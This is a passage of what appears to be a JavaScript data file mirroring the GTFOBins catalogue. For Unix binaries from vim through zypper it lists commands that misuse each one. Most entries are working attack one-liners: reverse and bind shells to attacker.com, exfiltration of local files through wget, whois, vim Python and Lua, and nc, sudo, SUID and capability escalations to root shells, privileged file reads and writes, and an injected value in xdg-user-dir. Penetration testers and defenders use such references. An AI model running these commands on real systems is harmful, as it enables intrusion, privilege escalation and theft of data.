                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nvim -c \':lua local s=require("socket"); local t=assert(s.tcp());\n  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,"r"));\n    local b=assert(f:read("*a"));t:send(b);\n  end;\n  f:close();t:close();\'\n',
                    },
                ],
                "non-interactive-bind-shell": [
                    {
                        description:
                            "Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.",
                        code: 'export LPORT=12345\nvim -c \':lua local k=require("socket");\n  local s=assert(k.bind("*",os.getenv("LPORT")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,"r"));\n    local b=assert(f:read("*a"));c:send(b);\n  end;c:close();f:close();\'\n',
                    },
                ],
                "file-upload": [
                    {
                        description:
                            'This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.',
                        code: 'export URL=http://attacker.com/\nexport LFILE=file_to_send\nvim -c \':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))\nvim.command(":q!")\'\n',
                    },
                    {
                        description:
                            "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.",
                        code: 'export LPORT=8888\nvim -c \':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(":q!")\'\n',
                    },
                    {
                        description:
                            'Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.',
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nvim -c \':lua local f=io.open(os.getenv("LFILE"), \'rb\')\n  local d=f:read("*a")\n  io.close(f);\n  local s=require("socket");\n  local t=assert(s.tcp());\n  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));\n  t:send(d);\n  t:close();\'\n',
                    },
                ],
                "file-download": [
                    {
                        description:
                            "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.",
                        code: 'export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nvim -c \':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e["URL"], e["LFILE"])\nvim.command(":q!")\'\n',
                    },
                    {
                        description:
                            'Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.',
                        code: 'export LPORT=12345\nexport LFILE=file_to_save\nvim -c \':lua local k=require("socket");\n  local s=assert(k.bind("*",os.getenv("LPORT")));\n  local c=s:accept();\n  local d,x=c:receive("*a");\n  c:close();\n  local f=io.open(os.getenv("LFILE"), "wb");\n  f:write(d);\n  io.close(f);\'\n',
                    },
                ],
                "file-write": [
                    {
                        code: "vim file_to_write\niDATA\n^[\nw\n",
                    },
                ],
                "file-read": [
                    {
                        code: "vim file_to_read",
                    },
                ],
                "library-load": [
                    {
                        description:
                            "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: 'vim -c \':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")\'',
                    },
                ],
                suid: [
                    {
                        description:
                            "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: './vim -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
                    },
                ],
                sudo: [
                    {
                        code: "sudo vim -c ':!/bin/sh'",
                    },
                    {
                        description:
                            "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: 'sudo vim -c \':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
                    },
                    {
                        description: "This requires that `vim` is compiled with Lua support.",
                        code: "sudo vim -c ':lua os.execute(\"reset; exec sh\")'",
                    },
                ],
                capabilities: [
                    {
                        description:
                            "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: './vim -c \':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
                    },
                ],
                "limited-suid": [
                    {
                        description: "This requires that `vim` is compiled with Lua support.",
                        code: "./vim -c ':lua os.execute(\"reset; exec sh\")'",
                    },
                ],
            },
        },
        vimdiff: {
            functions: {
                shell: [
                    {
                        code: "vimdiff -c ':!/bin/sh'",
                    },
                    {
                        code: "vimdiff\n:set shell=/bin/sh\n:shell\n",
                    },
                    {
                        description:
                            "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: 'vimdiff -c \':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
                    },
                    {
                        description: "This requires that `vimdiff` is compiled with Lua support.",
                        code: "vimdiff -c ':lua os.execute(\"reset; exec sh\")'",
                    },
                ],
                "reverse-shell": [
                    {
                        description:
                            "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nvimdiff -c \':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn("/bin/sh")\nvim.command(":q!")\'\n',
                    },
                ],
                "non-interactive-reverse-shell": [
                    {
                        description:
                            "Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nvimdiff -c \':lua local s=require("socket"); local t=assert(s.tcp());\n  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,"r"));\n    local b=assert(f:read("*a"));t:send(b);\n  end;\n  f:close();t:close();\'\n',
                    },
                ],
                "non-interactive-bind-shell": [
                    {
                        description:
                            "Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.",
                        code: 'export LPORT=12345\nvimdiff -c \':lua local k=require("socket");\n  local s=assert(k.bind("*",os.getenv("LPORT")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,"r"));\n    local b=assert(f:read("*a"));c:send(b);\n  end;c:close();f:close();\'\n',
                    },
                ],
                "file-upload": [
                    {
                        description:
                            'This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.',
                        code: 'export URL=http://attacker.com/\nexport LFILE=file_to_send\nvimdiff -c \':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))\nvim.command(":q!")\'\n',
                    },
                    {
                        description:
                            "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.",
                        code: 'export LPORT=8888\nvimdiff -c \':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(":q!")\'\n',
                    },
                    {
                        description:
                            'Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.',
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nvimdiff -c \':lua local f=io.open(os.getenv("LFILE"), \'rb\')\n  local d=f:read("*a")\n  io.close(f);\n  local s=require("socket");\n  local t=assert(s.tcp());\n  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));\n  t:send(d);\n  t:close();\'\n',
                    },
                ],
                "file-download": [
                    {
                        description:
                            "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.",
                        code: 'export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nvimdiff -c \':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e["URL"], e["LFILE"])\nvim.command(":q!")\'\n',
                    },
                    {
                        description:
                            'Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.',
                        code: 'export LPORT=12345\nexport LFILE=file_to_save\nvimdiff -c \':lua local k=require("socket");\n  local s=assert(k.bind("*",os.getenv("LPORT")));\n  local c=s:accept();\n  local d,x=c:receive("*a");\n  c:close();\n  local f=io.open(os.getenv("LFILE"), "wb");\n  f:write(d);\n  io.close(f);\'\n',
                    },
                ],
                "file-write": [
                    {
                        code: "vimdiff file_to_write\niDATA\n^[\nw\n",
                    },
                ],
                "file-read": [
                    {
                        code: "vimdiff file_to_read",
                    },
                ],
                "library-load": [
                    {
                        description:
                            "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: 'vimdiff -c \':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")\'',
                    },
                ],
                suid: [
                    {
                        description:
                            "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: './vimdiff -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
                    },
                ],
                sudo: [
                    {
                        code: "sudo vimdiff -c ':!/bin/sh'",
                    },
                    {
                        description:
                            "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: 'sudo vimdiff -c \':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
                    },
                    {
                        description: "This requires that `vimdiff` is compiled with Lua support.",
                        code: "sudo vimdiff -c ':lua os.execute(\"reset; exec sh\")'",
                    },
                ],
                capabilities: [
                    {
                        description:
                            "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: './vimdiff -c \':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
                    },
                ],
                "limited-suid": [
                    {
                        description: "This requires that `vimdiff` is compiled with Lua support.",
                        code: "./vimdiff -c ':lua os.execute(\"reset; exec sh\")'",
                    },
                ],
            },
        },
        vipw: {
            description:
                "This command allows to edit some designated files (`/etc/passwd`, `/etc/group`, `/etc/shadow` and `/etc/gshadow`) safely by spawning the default editor (falling back to [`vim`](/gtfobins/vim/), other functions may apply). Despite requiring superuser privileges to run, the editor is executed as the unprivileged user when run as SUID or with `sudo`.",
            functions: {
                suid: [
                    {
                        code: "./vipw",
                    },
                ],
                sudo: [
                    {
                        code: "sudo vipw",
                    },
                ],
            },
        },
        virsh: {
            functions: {
                sudo: [
                    {
                        code: "SCRIPT=script_to_run\nTF=$(mktemp)\ncat > $TF << EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='$SCRIPT'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nsudo virsh -c qemu:///system create $TF\nvirsh -c qemu:///system destroy x\n",
                    },
                ],
                "file-write": [
                    {
                        description:
                            "This requires the user to be in the `libvirt` group to perform privileged file write. If the target directory doesn't exist, `pool-create-as` must be run with the `--build` option. The destination file ownership and permissions can be set in the XML.",
                        code: "LFILE_DIR=/root\nLFILE_NAME=file_to_write\n\necho 'data' > data_to_write\n\nTF=$(mktemp)\ncat > $TF <<EOF\n<volume type='file'>\n  <name>y</name>\n  <key>$LFILE_DIR/$LFILE_NAME</key>\n  <source>\n  </source>\n  <capacity unit='bytes'>5</capacity>\n  <allocation unit='bytes'>4096</allocation>\n  <physical unit='bytes'>5</physical>\n  <target>\n    <path>$LFILE_DIR/$LFILE_NAME</path>\n    <format type='raw'/>\n    <permissions>\n      <mode>0600</mode>\n      <owner>0</owner>\n      <group>0</group>\n    </permissions>\n  </target>\n</volume>\nEOF\n\nvirsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR\nvirsh -c qemu:///system vol-create --pool x --file $TF\nvirsh -c qemu:///system vol-upload --pool x $LFILE_DIR/$LFILE_NAME data_to_write\nvirsh -c qemu:///system pool-destroy x\n",
                    },
                ],
                "file-read": [
                    {
                        description:
                            "This requires the user to be in the `libvirt` group to perform privileged file read.",
                        code: "LFILE_DIR=/root\nLFILE_NAME=file_to_read\n\nSPATH=file_to_save\n\nvirsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR\nvirsh -c qemu:///system vol-download --pool x $LFILE_NAME $SPATH\nvirsh -c qemu:///system pool-destroy x\n",
                    },
                ],
            },
        },
        volatility: {
            description:
                "This command requires some valid coredump file which, if not available, can be uploaded to the target. The `volshell` command spawns a [`python`](/gtfobins/python/) shell, other functions may apply.",
            functions: {
                shell: [
                    {
                        code: "volatility -f file.dump volshell\n__import__('os').system('/bin/sh')\n",
                    },
                ],
            },
        },
        w3m: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nw3m "$LFILE" -dump\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./w3m "$LFILE" -dump\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo w3m "$LFILE" -dump\n',
                    },
                ],
            },
        },
        wall: {
            description: "The textual file is dumped on the current TTY (neither to `stdout` nor to `stderr`).",
            functions: {
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo wall --nobanner "$LFILE"\n',
                    },
                ],
            },
        },
        watch: {
            functions: {
                shell: [
                    {
                        code: "watch -x sh -c 'reset; exec sh 1>&0 2>&0'",
                    },
                ],
                suid: [
                    {
                        description: "This keeps the SUID privileges only if the `-x` option is present.",
                        code: "./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'",
                    },
                ],
                sudo: [
                    {
                        code: "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./watch 'reset; exec sh 1>&0 2>&0'",
                    },
                ],
            },
        },
        wc: {
            description:
                "The file content is parsed as a sequence of `\\x00` separated paths. On error the file content appears in a message, so this may not be suitable to read binary files.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nwc --files0-from "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./wc --files0-from "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo wc --files0-from "$LFILE"\n',
                    },
                ],
            },
        },
        wget: {
            functions: {
                shell: [
                    {
                        code: "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh\\n/bin/sh 1>&0' >$TF\nwget --use-askpass=$TF 0\n",
                    },
                ],
                "file-upload": [
                    {
                        description:
                            "Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use `--post-data` to send hard-coded data.",
                        code: "URL=http://attacker.com/\nLFILE=file_to_send\nwget --post-file=$LFILE $URL\n",
                    },
                ],
                "file-read": [
                    {
                        description:
                            "The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data.",
                        code: "LFILE=file_to_read\nwget -i $LFILE\n",
                    },
                ],
                "file-write": [
                    {
                        description:
                            "The data to be written is treated as a list of URLs, one per line, which are actually fetched by `wget`. The data is written, somewhat modified, as error messages, thus this is not suitable to write arbitrary binary data.",
                        code: "LFILE=file_to_write\nTF=$(mktemp)\necho DATA > $TF\nwget -i $TF -o $LFILE\n",
                    },
                ],
                "file-download": [
                    {
                        description: "Fetch a remote file via HTTP GET request.",
                        code: "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nwget $URL -O $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF\n./wget --use-askpass=$TF 0\n",
                    },
                ],
                sudo: [
                    {
                        code: "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh\\n/bin/sh 1>&0' >$TF\nsudo wget --use-askpass=$TF 0\n",
                    },
                ],
            },
        },
        whiptail: {
            description:
                "The file is shown in an interactive TUI dialog made for displaying text, arrows can be used to scroll long content.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nwhiptail --textbox --scrolltext "$LFILE" 0 0\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./whiptail --textbox --scrolltext "$LFILE" 0 0\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo whiptail --textbox --scrolltext "$LFILE" 0 0\n',
                    },
                ],
            },
        },
        whois: {
            description: "`whois` hangs waiting for the remote peer to close the socket.\n",
            functions: {
                "file-upload": [
                    {
                        description:
                            "Send a text file to a TCP port. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. The file has a trailing `$'\\x0d\\x0a'` and its length is limited by the maximum size of arguments.",
                        code: 'RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nwhois -h $RHOST -p $RPORT "`cat $LFILE`"\n',
                    },
                    {
                        description:
                            "Send a binary file to a TCP port. Run `nc -l -p 12345 | tr -d $'\\x0d' | base64 -d > \"file_to_save\"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments.",
                        code: 'RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nwhois -h $RHOST -p $RPORT "`base64 $LFILE`"\n',
                    },
                ],
                "file-download": [
                    {
                        description:
                            "Fetch remote text file from a remote TCP port. Run `nc -l -p 12345 < \"file_to_send\"` on the attacker box to send the file. The file has instances of `$'\\x0d'` stripped.",
                        code: 'RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT > "$LFILE"\n',
                    },
                    {
                        description:
                            'Fetch remote binary file from a remote TCP port. Run `base64 "file_to_send" | nc -l -p 12345` on the attacker box to send the file.',
                        code: 'RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT | base64 -d > "$LFILE"\n',
                    },
                ],
            },
        },
        wireshark: {
            functions: {
                command: [
                    {
                        description:
                            'This requires GUI interaction. Start Wireshark, then from the main menu, select "Tools" -> "Lua" -> "Evaluate". A window opens that allows to execute [`lua`](/gtfobins/lua/) code.\n',
                        code: "wireshark",
                    },
                ],
                sudo: [
                    {
                        description:
                            'This technique can be used to write arbitrary files, i.e., the dump of one UDP packet.\n\nAfter starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with `nc` (see below). The capture then stops and the packet dump can be saved:\n\n1. select the only received packet;\n\n2. right-click on "Data" from the "Packet Details" pane, and select "Export Packet Bytes...";\n\n3. choose where to save the packet dump.\n',
                        code: 'PORT=4444\nsudo wireshark -c 1 -i lo -k -f "udp port $PORT" &\necho \'DATA\' | nc -u 127.127.127.127 "$PORT"\n',
                    },
                ],
            },
        },
        wish: {
            functions: {
                shell: [
                    {
                        code: "wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n",
                    },
                ],
                "non-interactive-reverse-shell": [
                    {
                        description: "Run `nc -l -p 12345` on the attacker box to receive the shell.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\necho \'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;\' | wish\n',
                    },
                ],
                sudo: [
                    {
                        code: "sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n",
                    },
                ],
            },
        },
        xargs: {
            functions: {
                shell: [
                    {
                        description: "GNU version only.",
                        code: "xargs -a /dev/null sh",
                    },
                    {
                        code: "echo x | xargs -Iy sh -c 'exec sh 0<&1'",
                    },
                    {
                        description: "Read interactively from `stdin`.",
                        code: "xargs -Ix sh -c 'exec sh 0<&1'\nx^D^D\n",
                    },
                ],
                "file-read": [
                    {
                        description:
                            "This works as long as the file does not contain the NUL character, also a trailing `$'\\n'` is added. The actual `/bin/echo` command is executed. GNU version only.",
                        code: 'LFILE=file_to_read\nxargs -a "$LFILE" -0\n',
                    },
                ],
                suid: [
                    {
                        description: "GNU version only.",
                        code: "./xargs -a /dev/null sh -p",
                    },
                ],
                sudo: [
                    {
                        description: "GNU version only.",
                        code: "sudo xargs -a /dev/null sh",
                    },
                ],
            },
        },
        "xdg-user-dir": {
            description:
                "The current implementation of `xdg-user-dir` is basically `eval echo \\${XDG_${1}_DIR:-$HOME}`, thus is can be easily used to achieve command execution.\n",
            functions: {
                shell: [
                    {
                        code: "xdg-user-dir '}; /bin/sh #'\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo xdg-user-dir '}; /bin/sh #'\n",
                    },
                ],
            },
        },
        xdotool: {
            description: "This requires a running X server.",
            functions: {
                shell: [
                    {
                        code: "xdotool exec --sync /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./xdotool exec --sync /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo xdotool exec --sync /bin/sh",
                    },
                ],
            },
        },
        xelatex: {
            functions: {
                shell: [
                    {
                        code: "xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n",
                    },
                ],
                "file-read": [
                    {
                        description: "The read file will be part of the output.",
                        code: "xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n",
                    },
                ],
                sudo: [
                    {
                        description: "The read file will be part of the output.",
                        code: "sudo xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n",
                    },
                    {
                        code: "sudo xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n",
                    },
                ],
            },
        },
        xetex: {
            functions: {
                shell: [
                    {
                        code: "xetex --shell-escape '\\write18{/bin/sh}\\end'\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo xetex --shell-escape '\\write18{/bin/sh}\\end'\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./xetex --shell-escape '\\write18{/bin/sh}\\end'\n",
                    },
                ],
            },
        },
        xmodmap: {
            description: "The read file content is corrupted by error prints.\n",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nxmodmap -v $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./xmodmap -v $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo xmodmap -v $LFILE\n",
                    },
                ],
            },
        },
        xmore: {
            description: "The file is displayed in a Xorg window, so it needs a working graphical environment.",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nxmore $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./xmore $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo xmore $LFILE\n",
                    },
                ],
            },
        },
        xpad: {
            description: "This is a GUI application. The file content is displayed in a sticky note.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nxpad -f "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo xpad -f "$LFILE"\n',
                    },
                ],
            },
        },
        xxd: {
            functions: {
                "file-write": [
                    {
                        code: 'LFILE=file_to_write\necho DATA | xxd | xxd -r - "$LFILE"\n',
                    },
                ],
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nxxd "$LFILE" | xxd -r\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./xxd "$LFILE" | xxd -r\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo xxd "$LFILE" | xxd -r\n',
                    },
                ],
            },
        },
        xz: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nxz -c "$LFILE" | xz -d\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./xz -c "$LFILE" | xz -d\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo xz -c "$LFILE" | xz -d\n',
                    },
                ],
            },
        },
        yarn: {
            functions: {
                shell: [
                    {
                        code: "yarn exec /bin/sh",
                    },
                    {
                        description:
                            "Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `yarn --cwd $TF run preinstall`.",
                        code: 'TF=$(mktemp -d)\necho \'{"scripts": {"preinstall": "/bin/sh"}}\' > $TF/package.json\nyarn --cwd $TF install\n',
                    },
                ],
                sudo: [
                    {
                        code: "sudo yarn exec /bin/sh",
                    },
                ],
            },
        },
        yash: {
            functions: {
                shell: [
                    {
                        code: "yash",
                    },
                ],
                suid: [
                    {
                        code: "./yash",
                    },
                ],
                sudo: [
                    {
                        code: "sudo yash",
                    },
                ],
            },
        },
        yelp: {
            functions: {
                "file-read": [
                    {
                        description:
                            "This spawns a graphical window containing the file content somehow corrupted by word wrapping, it might not be suitable to read arbitrary files. The path must be absolute.",
                        code: 'LFILE=file_to_read\nyelp "man:$LFILE"\n',
                    },
                ],
            },
        },
        yum: {
            functions: {
                "file-download": [
                    {
                        description:
                            "Fetch a remote file via HTTP GET request. The file on the remote host must have an extension of `.rpm`, the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp`, for example `/var/tmp/yum-root-cR0O4h/`.",
                        code: "RHOST=attacker.com\nRFILE=file_to_get.rpm\nyum install http://$RHOST/$RFILE\n",
                    },
                ],
                sudo: [
                    {
                        description:
                            "It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n```\n",
                        code: "sudo yum localinstall -y x-1.0-1.noarch.rpm\n",
                    },
                    {
                        description: "Spawn interactive root shell by loading a custom plugin.\n",
                        code: "TF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y\n",
                    },
                ],
            },
        },
        zathura: {
            description: "The interaction happens in a GUI window, while the shell is dropped in the terminal.",
            functions: {
                shell: [
                    {
                        code: "zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'\n",
                    },
                ],
            },
        },
        zip: {
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file-to-read\nTF=$(mktemp -u)\nzip $TF $LFILE\nunzip -p $TF\n",
                    },
                ],
                shell: [
                    {
                        code: "TF=$(mktemp -u)\nzip $TF /etc/hosts -T -TT 'sh #'\nrm $TF\n",
                    },
                ],
                sudo: [
                    {
                        code: "TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "TF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n",
                    },
                ],
            },
        },
        zsh: {
            functions: {
                "file-read": [
                    {
                        code: "export LFILE=file_to_read\nzsh -c 'echo \"$(<$LFILE)\"'\n",
                    },
                ],
                "file-write": [
                    {
                        code: "export LFILE=file_to_write\nzsh -c 'echo DATA >$LFILE'\n",
                    },
                ],
                shell: [
                    {
                        code: "zsh",
                    },
                ],
                suid: [
                    {
                        code: "./zsh",
                    },
                ],
                sudo: [
                    {
                        code: "sudo zsh",
                    },
                ],
            },
        },
        zsoelim: {
            description:
                "The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nzsoelim "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./zsoelim "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo zsoelim "$LFILE"\n',
                    },
                ],
            },
        },
        zypper: {
            functions: {
                shell: [
                    {
                        description:
                            "This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges.",
                        code: "zypper x\n",
                    },
                    {
                        code: `"TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nexport PATH=$TF:$PATH\nzypper x\n"`,
